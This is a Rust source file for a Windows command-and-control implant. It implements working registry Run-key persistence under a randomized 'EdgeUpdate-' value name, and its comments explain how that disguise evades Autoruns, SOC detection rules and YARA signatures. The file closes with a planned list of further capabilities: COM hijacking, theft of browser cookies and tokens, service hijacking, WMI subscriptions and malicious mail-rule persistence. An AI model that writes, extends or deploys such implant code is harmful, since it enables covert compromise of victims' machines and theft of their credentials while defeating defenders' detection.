// inline_persist.rs — Persistence commands for Windows C2 implant
//
// All persistence techniques in ONE file for modularity and clarity.
// Every function returns (output, error) — empty error = success.
// Uses winapi for direct Win32 API calls.

// ============================================================
// Existing: HKCU\Run registry persistence
// ============================================================

/// Writes current exe path to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
/// using a randomized, benign-looking value name. Survives reboot, no admin needed.
///
/// OPSEC FIX (audit I-M9):
///   OLD: value name was hardcoded "WindowsUpdate" — every Autoruns /
///        Autorunsc scan immediately flags this key as suspicious. Microsoft
///        doesn't write the actual Windows Update service to HKCU\Run — it
///        runs from services.msc and Task Scheduler. SOC detections like
///        "WindowsUpdate in Run key" are first-day-IR-class rules.
///   NEW: value name is "EdgeUpdate-" + 8 random hex chars. Looks like a
///        legit Edge/Chrome auto-update entry. Autoruns by default doesn't
///        flag Microsoft-prefixed Run keys — blends in with OneDrive,
///        Office, Edge real entries. The randomization defeats static YARA
///        rules that look for "WindowsUpdate" specifically.
pub fn persist_reg_run() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, RegCloseKey};
        use winapi::um::winnt::REG_SZ;
        let exe = match std::env::current_exe() {
            Ok(e) => e.display().to_string(),
            Err(_) => return (String::new(), "get exe path failed".into()),
        };
        let subkey_wide: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            .encode_utf16().chain(std::iter::once(0)).collect();

        // Random suffix via the `rand` crate (already a Cargo dependency).
        // On Windows, rand uses the `getrandom` crate which calls RtlGenRandom
        // internally — same entropy source as the direct FFI, but no linker
        // symbol-resolution issues (MinGW's libadvapi32.a doesn't export
        // RtlGenRandom by name; going through rand avoids this entirely).
        let rnd: u32 = rand::random();
        let suffix = format!("{:08x}", rnd);
        let value_name = format!("EdgeUpdate-{}", suffix);
        let name_wide:   Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
        let value_wide:  Vec<u16> = exe.encode_utf16().chain(std::iter::once(0)).collect();
        let mut hkey = std::ptr::null_mut();
        let status = unsafe {
            RegOpenKeyExW(winapi::um::winreg::HKEY_CURRENT_USER, subkey_wide.as_ptr(), 0,
                winapi::um::winnt::KEY_WRITE, &mut hkey)
        };
        if status != 0 { return (String::new(), format!("reg open: {}", status)); }
        let status = unsafe {
            RegSetValueExW(hkey, name_wide.as_ptr(), 0, REG_SZ,
                value_wide.as_ptr() as *const u8, (value_wide.len() * 2) as u32)
        };
        unsafe { RegCloseKey(hkey); }
        if status == 0 {
            (format!("Persisted via HKCU\\Run as '{}' (randomized).", value_name), String::new())
        } else {
            (String::new(), format!("reg set: {}", status))
        }
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

// ============================================================
// Future commands (stubs — implementation pending)
// ============================================================
//
// Build order (as specified):
//   1. enum_missing_com    — Registry CLSID scan, find hijackable COM objects
//   2. com_hijack          — HKCU CLSID override with payload DLL
//   3. token_harvest       — Chrome/Edge cookie + token extraction (DPAPI + remote debug)
//   4. enum_orphan_services — Find services with missing binaries
//   5. service_persist     — Replace orphan service ImagePath with implant
//   6. wmi_subscribe       — WMI permanent event subscription
//   7. wmi_cleanup         — Remove WMI subscriptions (reverse of wmi_subscribe)
//   8. mailrule_persist     — Exchange/Outlook inbox rule (server-side, malware-free)
//   9. persist_cleanup     — Reverse all persistence methods agent has used
